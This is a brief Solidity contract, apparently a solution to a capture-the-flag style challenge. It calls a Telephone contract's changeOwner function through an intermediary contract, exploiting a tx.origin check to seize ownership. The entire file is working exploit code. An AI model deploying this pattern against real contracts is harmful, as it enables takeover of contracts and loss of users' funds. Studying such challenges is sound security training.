// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Telephone.sol";

contract TelephoneHack {
    Telephone immutable telContract;

    constructor(address _telephoneAddr) {
        telContract = Telephone(_telephoneAddr);
    }

    function Attack() external payable {
        telContract.changeOwner(msg.sender);
    }
}
